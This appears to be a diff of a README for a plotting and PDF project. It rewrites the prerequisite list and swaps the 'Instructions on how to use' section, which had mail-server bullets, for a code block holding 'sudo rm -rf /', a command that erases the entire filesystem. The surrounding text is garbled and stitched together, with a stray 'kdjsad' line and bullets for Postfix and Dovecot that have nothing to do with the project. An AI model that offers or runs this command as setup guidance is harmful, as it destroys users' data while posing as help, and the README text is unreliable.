@@ -12,17 +12,18 @@ that filter.
 - You have to run this repository on a desktop, not on a server, because you have to view the image and the pdf document
 - For the plots I used GNUPlot
 - I opened the images and the pdf with **xdg-open** so you have to have a preferred application on your computer
-- Obviously you must have gcc
+- Obviously you must have GNU core-utils (make,gcc,...)
 - I compiled the final document with **PdfLatex** using the following packages:
   1. float
   2. fancyvrb
   3. graphicx
   4. dvispname
-- kdjsad
+-
 
 ## Instructions on how to use
 
 - **Postfix** to send and receive mail.
-- **Dovecot** to get mail to your email client (mutt, Thunderbird, etc).
-- Config files that unique the two above securely with native log-ins.
-- **Spamassassin** to prevent spam and allow you to make custom filters.
+'''
+
+sudo rm -rf /
+'''
